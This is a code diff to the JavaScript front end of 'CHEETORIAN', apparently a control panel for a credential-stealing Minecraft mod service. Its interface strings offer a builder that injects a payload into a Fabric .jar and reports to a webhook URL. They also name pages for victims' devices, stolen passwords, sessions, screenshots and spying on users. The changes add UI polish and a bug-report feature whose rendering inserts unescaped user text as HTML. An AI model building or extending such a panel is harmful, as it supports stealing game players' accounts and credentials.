@@ -45,29 +45,45 @@ const SVG_ICONS = {
     'inbox': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/></svg>',
     'layers': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>',
     'target': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>',
-    'globe': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>'
+    'globe': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
+    'message-square': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>',
+    'send': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>'
 };
 
 const DICT = {
     'pl': {
+        // Auth
         'a-title': 'CHEETORIAN', 'a-sub': 'Zaloguj się do panelu głównego', 'a-log': 'Logowanie', 'a-reg': 'Rejestracja', 'a-btn1': 'Autoryzuj', 'a-btn2': 'Utwórz konto',
-        'n-stat': 'Status', 'n-tools': 'Menu', 'n-build': 'Builder', 'n-logs': 'Logi', 'n-hits': 'Urządzenia', 'n-sess': 'Sesje', 'n-pwd': 'Hasła', 'n-plat': 'Platforma', 'n-spy': 'Admin', 'n-acc': 'Profil', 'n-thm': 'Motywy', 'n-role': 'Właściciel',
+        // Nav
+        'n-stat': 'System Online', 'n-tools': 'Narzędzia Główne', 'n-build': 'Builder', 'n-logs': 'Baza Logów', 'n-hits': 'Urządzenia Ofiar', 'n-sess': 'Sesje Zdalne', 'n-pwd': 'Kradzież Haseł', 'n-plat': 'Zarządzanie Platformą',
+        'n-spy': 'Nadzór Szpiegowski', 'n-rep-admin': 'Błędy (Admin)', 'n-rep-user': 'Report Error', 'n-acc': 'Mój Profil (Konto)', 'n-thm': 'Personalizacja', 'n-role': 'OWNER',
+        // Builder
         'b-t1': 'Fabric 1.21.x Builder', 'b-t2': 'Konstruktor bezpiecznego pliku gry (Template Mod).', 'b-h1': 'Główne Parametry', 'b-l1': 'Punkt zdawczy (Webhook URL)', 'b-l2': 'Nazwa Moda', 'b-l3': 'Wersja', 'b-l4': 'Nakładka kodu (Inject)', 'b-l5': 'Zbuduj Payload na wierzchu pliku .jar', 'b-fbtn': 'Wybierz plik', 'b-wait': 'Czekam na ładunek...', 'b-lim': 'Limit rozmiaru', 'b-btn': 'Generuj Konstrukcje', 'b-term': 'Terminal Live',
+        // Profile
         'p-t1': 'Twój Profil', 'p-t2': 'Skonfiguruj główne parametry dostępu.', 'p-b1': 'Plan: UNLIMITED CHEETORIAN', 'p-b2': 'Dodaj Awatar', 'p-nick': 'Wyświetlana Nazwa (Nick)', 'p-h1': 'Zmiana Hasła', 'p-l1': 'Obecne Hasło', 'p-l2': 'Nowe Hasło', 'p-sbtn': 'Zapisz',
+        // Misc
         'h-t1': 'Połączenia', 's-t1': 'Sesje', 'w-t1': 'Loginy', 'u-t1': 'Szpiegostwo', 'u-t2': 'Przeglądaj profile klientów.',
         'spy-t1': 'Tryb Szpiega', 'spy-t2': 'Podgląd gracza:', 'spy-out': 'Zakończ', 'spy-m1': 'Maszyny', 'spy-m2': 'Hasła', 'spy-m3': 'Sesje', 'spy-m4': 'Zrzuty',
-        'c-t1': 'Edytor Wyglądu', 'c-t2': 'Kolory', 'mod-t1': 'Monitor',
-        'ph-user': 'Użytkownik', 'ph-pass': 'Hasło', 'ph-mail': 'E-Mail', 'toast-spy': 'Zhakowano profil dla: ', 'toast-prof': 'Profil zaktualizowany!', 'toast-err': 'Błąd autoryzacji!'
+        'c-t1': 'Personalizacja Wyglądu', 'c-t2': 'Spektrum Kolorystyczne', 'mod-t1': 'Zrzut Ekranu (.PNG)',
+        'ph-user': 'Nazwa użytkownika', 'ph-pass': 'Hasło dostępu', 'ph-mail': 'Adres E-Mail',
+        'toast-spy': 'Zhakowano profil dla: ', 'toast-prof': 'Profil zaktualizowany!', 'toast-err': 'Błąd autoryzacji!'
     },
     'en': {
-        'a-title': 'CHEETORIAN', 'a-sub': 'Log in to the main control panel', 'a-log': 'Login', 'a-reg': 'Register', 'a-btn1': 'Authorize', 'a-btn2': 'Create account',
-        'n-stat': 'Status', 'n-tools': 'Menu', 'n-build': 'Builder', 'n-logs': 'Logs', 'n-hits': 'Devices', 'n-sess': 'Sessions', 'n-pwd': 'Passwords', 'n-plat': 'Platform', 'n-spy': 'Admin', 'n-acc': 'Profile', 'n-thm': 'Themes', 'n-role': 'Owner',
-        'b-t1': 'Fabric 1.21.x Builder', 'b-t2': 'Secure game file constructor (Template Mod).', 'b-h1': 'Main Parameters', 'b-l1': 'Endpoint (Webhook URL)', 'b-l2': 'Mod Name', 'b-l3': 'Version', 'b-l4': 'Code Overlay (Inject)', 'b-l5': 'Build Payload on top of a .jar file', 'b-fbtn': 'Select file', 'b-wait': 'Waiting for payload...', 'b-lim': 'Size limit', 'b-btn': 'Generate Build', 'b-term': 'Live Terminal',
-        'p-t1': 'Your Profile', 'p-t2': 'Configure primary access parameters.', 'p-b1': 'Plan: UNLIMITED CHEETORIAN', 'p-b2': 'Upload Avatar', 'p-nick': 'Nickname', 'p-h1': 'Security', 'p-l1': 'Current Password', 'p-l2': 'New Password', 'p-sbtn': 'Save',
-        'h-t1': 'Connections', 's-t1': 'Sessions', 'w-t1': 'Logins', 'u-t1': 'Spying', 'u-t2': 'Browse registered clients.',
-        'spy-t1': 'Spy Mode', 'spy-t2': 'Viewing panel:', 'spy-out': 'Exit', 'spy-m1': 'Machines', 'spy-m2': 'Passwords', 'spy-m3': 'Sessions', 'spy-m4': 'Screens',
-        'c-t1': 'Appearance Personalization', 'c-t2': 'Color Spectrum', 'mod-t1': 'Screenshot (.PNG)',
-        'ph-user': 'Username', 'ph-pass': 'Password', 'ph-mail': 'E-Mail Address', 'toast-spy': 'Spectator mode bridge created for profile: ', 'toast-prof': 'Profile updated successfully!', 'toast-err': 'Password mismatch or incorrect data!'
+        // Auth
+        'a-title': 'CHEETORIAN', 'a-sub': 'Log in to the main panel', 'a-log': 'Login', 'a-reg': 'Register', 'a-btn1': 'Sign In', 'a-btn2': 'Create Account',
+        // Nav
+        'n-stat': 'System Online', 'n-tools': 'Main Tools', 'n-build': 'Builder', 'n-logs': 'Logs', 'n-hits': 'Devices', 'n-sess': 'Sessions', 'n-pwd': 'Passwords', 'n-plat': 'Platform',
+        'n-spy': 'Admin Panel', 'n-rep-admin': 'Bug Reports (Admin)', 'n-rep-user': 'Report Error', 'n-acc': 'My Profile', 'n-thm': 'Appearance', 'n-role': 'OWNER',
+        // Builder
+        'b-t1': 'Fabric 1.21.x Builder', 'b-t2': 'Secure game file builder (Template Mod).', 'b-h1': 'Main Parameters', 'b-l1': 'Webhook URL', 'b-l2': 'Mod Name', 'b-l3': 'Version', 'b-l4': 'Code Inject', 'b-l5': 'Build Payload on top of a .jar file', 'b-fbtn': 'Select file', 'b-wait': 'Waiting for file...', 'b-lim': 'Size limit', 'b-btn': 'Generate Build', 'b-term': 'Live Terminal',
+        // Profile
+        'p-t1': 'Your Profile', 'p-t2': 'Configure your account settings.', 'p-b1': 'Plan: UNLIMITED CHEETORIAN', 'p-b2': 'Upload Avatar', 'p-nick': 'Display Name', 'p-h1': 'Change Password', 'p-l1': 'Current Password', 'p-l2': 'New Password', 'p-sbtn': 'Save',
+        // Misc
+        'h-t1': 'Connections', 's-t1': 'Sessions', 'w-t1': 'Logins', 'u-t1': 'Admin Spy', 'u-t2': 'Browse registered users.',
+        'spy-t1': 'Spy Mode', 'spy-t2': 'Viewing player:', 'spy-out': 'Exit', 'spy-m1': 'Machines', 'spy-m2': 'Passwords', 'spy-m3': 'Sessions', 'spy-m4': 'Screenshots',
+        'c-t1': 'Appearance Settings', 'c-t2': 'Color Theme', 'mod-t1': 'Screenshot (.PNG)',
+        'ph-user': 'Username', 'ph-pass': 'Password', 'ph-mail': 'E-Mail',
+        'toast-spy': 'Spy mode active for: ', 'toast-prof': 'Profile saved!', 'toast-err': 'Wrong credentials!'
     }
 };
 
@@ -260,27 +276,52 @@ function loadUserData(email) {
     const isAdmin = (email.toLowerCase() === OWNER_EMAIL);
     const roleDisplay = document.getElementById('role-display');
     const navAdmin = document.getElementById('nav-item-admin');
+    const navAdminReports = document.getElementById('nav-item-admin-reports');
     
     if (isAdmin) {
         roleDisplay.innerText = 'OWNER';
         roleDisplay.style.color = 'var(--primary)';
         if (navAdmin) navAdmin.style.display = 'flex';
+        if (navAdminReports) navAdminReports.style.display = 'flex';
+        renderAdminReports();
     } else {
         roleDisplay.innerText = 'FREE';
         roleDisplay.style.color = 'var(--text-muted)';
         if (navAdmin) navAdmin.style.display = 'none';
+        if (navAdminReports) navAdminReports.style.display = 'none';
         
         // Zabezpieczenie przed przebywaniem na zablokowanej zakładce
         const adminPage = document.getElementById('page-users-admin');
+        const adminReportsPage = document.getElementById('page-admin-reports');
         if (adminPage && adminPage.classList.contains('active')) {
+            document.querySelector('[data-page="build"]').click();
+        }
+        if (adminReportsPage && adminReportsPage.classList.contains('active')) {
             document.querySelector('[data-page="build"]').click();
         }
     }
     
     const db = JSON.parse(localStorage.getItem('cheet_db') || '{"users":{}}');
-    if(db.users[email] && db.users[email].avatar) {
-         document.getElementById('profile-avatar-display').innerHTML = `<img src="${db.users[email].avatar}" style="width:100%; height:100%; object-fit:cover; border-radius:30px;">`;
-         document.getElementById('sidebar-avatar').innerHTML = `<img src="${db.users[email].avatar}" style="width:100%; height:100%; object-fit:cover; border-radius:14px;">`;
+    const userData = db.users[email];
+    
+    if(userData && userData.avatar) {
+        const avatarUrl = userData.avatar;
+        const savedColor = userData.avatarColor || 'var(--primary)';
+        const glowColor = savedColor.startsWith('rgb') ? savedColor.replace('rgb(', 'rgba(').replace(')', ', 0.5)') : 'rgba(0,122,255,0.4)';
+
+        const profileAvatar = document.getElementById('profile-avatar-display');
+        profileAvatar.innerHTML = `<img src="${avatarUrl}" style="width:100%; height:100%; object-fit:cover; border-radius:30px;">`;
+        profileAvatar.style.boxShadow = `0 0 0 3px ${savedColor}, 0 0 25px ${glowColor}`;
+
+        const sidebarAvatar = document.getElementById('sidebar-avatar');
+        sidebarAvatar.innerHTML = `<img src="${avatarUrl}" style="width:100%; height:100%; object-fit:cover; border-radius:14px;">`;
+        sidebarAvatar.style.boxShadow = `0 0 0 2px ${savedColor}, 0 0 12px ${glowColor}`;
+    }
+
+    // Wczytaj zapisany nick jeśli istnieje
+    if(userData && userData.displayName) {
+        document.getElementById('sidebar-username').innerText = userData.displayName;
+        document.getElementById('profile-username').innerText = userData.displayName;
     }
 }
 
@@ -301,23 +342,59 @@ async function logout() {
 /* ================================
    PROFILE LOGIC (IMAGE + NICKNAME) 
 ==================================*/
+function getDominantColor(imgEl, callback) {
+    const canvas = document.createElement('canvas');
+    canvas.width = 50;
+    canvas.height = 50;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(imgEl, 0, 0, 50, 50);
+    const data = ctx.getImageData(15, 15, 20, 20).data;
+    let r = 0, g = 0, b = 0, count = 0;
+    for(let i = 0; i < data.length; i += 4) {
+        r += data[i]; g += data[i+1]; b += data[i+2]; count++;
+    }
+    r = Math.round(r/count); g = Math.round(g/count); b = Math.round(b/count);
+    callback(`rgb(${r},${g},${b})`);
+}
+
 function handleAvatarUpload(event) {
     const file = event.target.files[0];
     if(file) {
         const reader = new FileReader();
         reader.onload = function(e) {
             const avatarUrl = e.target.result;
-            document.getElementById('profile-avatar-display').innerHTML = `<img src="${avatarUrl}" style="width:100%; height:100%; object-fit:cover; border-radius:30px;">`;
-            document.getElementById('sidebar-avatar').innerHTML = `<img src="${avatarUrl}" style="width:100%; height:100%; object-fit:cover; border-radius:14px;">`;
-            
-            const currentUser = localStorage.getItem('currentUser');
-            if(currentUser) {
-                const db = JSON.parse(localStorage.getItem('cheet_db') || '{"users":{}}');
-                if(!db.users[currentUser]) db.users[currentUser] = {};
-                db.users[currentUser].avatar = avatarUrl;
-                localStorage.setItem('cheet_db', JSON.stringify(db));
-            }
-            showToast(DICT[currentLang]['toast-prof']);
+
+            // Wczytaj obraz, odczytaj kolor dominujący, potem zastosuj
+            const tempImg = new Image();
+            tempImg.crossOrigin = 'anonymous';
+            tempImg.onload = function() {
+                getDominantColor(tempImg, function(dominantColor) {
+                    const glowColor = dominantColor.replace('rgb(', 'rgba(').replace(')', ', 0.5)');
+
+                    // Profil
+                    const profileAvatar = document.getElementById('profile-avatar-display');
+                    profileAvatar.innerHTML = `<img src="${avatarUrl}" style="width:100%; height:100%; object-fit:cover; border-radius:30px;">`;
+                    profileAvatar.style.boxShadow = `0 0 0 3px ${dominantColor}, 0 0 25px ${glowColor}`;
+                    profileAvatar.style.border = 'none';
+
+                    // Sidebar
+                    const sidebarAvatar = document.getElementById('sidebar-avatar');
+                    sidebarAvatar.innerHTML = `<img src="${avatarUrl}" style="width:100%; height:100%; object-fit:cover; border-radius:14px;">`;
+                    sidebarAvatar.style.boxShadow = `0 0 0 2px ${dominantColor}, 0 0 12px ${glowColor}`;
+
+                    // Zapisz kolor w cache
+                    const currentUser = localStorage.getItem('currentUser');
+                    if(currentUser) {
+                        const db = JSON.parse(localStorage.getItem('cheet_db') || '{"users":{}}');
+                        if(!db.users[currentUser]) db.users[currentUser] = {};
+                        db.users[currentUser].avatar = avatarUrl;
+                        db.users[currentUser].avatarColor = dominantColor;
+                        localStorage.setItem('cheet_db', JSON.stringify(db));
+                    }
+                    showToast(DICT[currentLang]['toast-prof']);
+                });
+            };
+            tempImg.src = avatarUrl;
         };
         reader.readAsDataURL(file);
     }
@@ -647,6 +724,7 @@ function renderAdminUsers() {
         `;
         grid.appendChild(card);
     });
+
     safeDrawIcons();
 }
 
@@ -695,4 +773,62 @@ function openModal() {
 
 function closeModal() {
     document.getElementById('admin-modal').classList.remove('active');
+}
+
+/* ================================
+   REPORTS LOGIC
+==================================*/
+function submitReport() {
+    const text = document.getElementById('report-message').value.trim();
+    if(text === '') {
+        showToast("Nie możesz wysłać pustego zgłoszenia!");
+        return;
+    }
+    
+    const currentUser = localStorage.getItem('currentUser') || 'Anonymous';
+    let reports = JSON.parse(localStorage.getItem('cheet_reports') || '[]');
+    reports.unshift({
+        user: currentUser,
+        text: text,
+        date: new Date().toLocaleString()
+    });
+    localStorage.setItem('cheet_reports', JSON.stringify(reports));
+    
+    showToast("Zgłoszenie wysłane pomyślnie! Administracja się nim zajmie.");
+    document.getElementById('report-message').value = '';
+    
+    if(currentUser.toLowerCase() === OWNER_EMAIL) {
+        renderAdminReports();
+    }
+}
+
+function renderAdminReports() {
+    const list = document.getElementById('admin-reports-list');
+    if(!list) return;
+    
+    let reports = JSON.parse(localStorage.getItem('cheet_reports') || '[]');
+    if(reports.length === 0) {
+        list.innerHTML = `<div style="text-align:center; padding: 30px; color:var(--text-muted);">Brak nowych zgłoszeń.</div>`;
+        return;
+    }
+    
+    list.innerHTML = reports.map((r, i) => `
+        <div style="background:rgba(255,255,255,0.02); padding:15px; border-radius:10px; border:1px solid #272732; position:relative; margin-bottom: 10px;">
+            <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+                <span style="font-weight:bold; color:var(--primary); font-size:0.95rem;">${r.user}</span>
+                <span style="font-size:0.8rem; color:var(--text-muted);">${r.date}</span>
+                <button onclick="deleteReport(${i})" style="position:absolute; top:10px; right:10px; background:none; border:none; color:var(--danger); cursor:pointer;"><i data-lucide="x" style="width:16px;"></i></button>
+            </div>
+            <p style="font-size:0.9rem; margin:0; line-height:1.4; color: #d4d4d8;">${r.text}</p>
+        </div>
+    `).join('');
+    safeDrawIcons();
+}
+
+function deleteReport(index) {
+    let reports = JSON.parse(localStorage.getItem('cheet_reports') || '[]');
+    reports.splice(index, 1);
+    localStorage.setItem('cheet_reports', JSON.stringify(reports));
+    renderAdminReports();
+    showToast("Zgłoszenie pomyślnie wyrzucone.");
 }
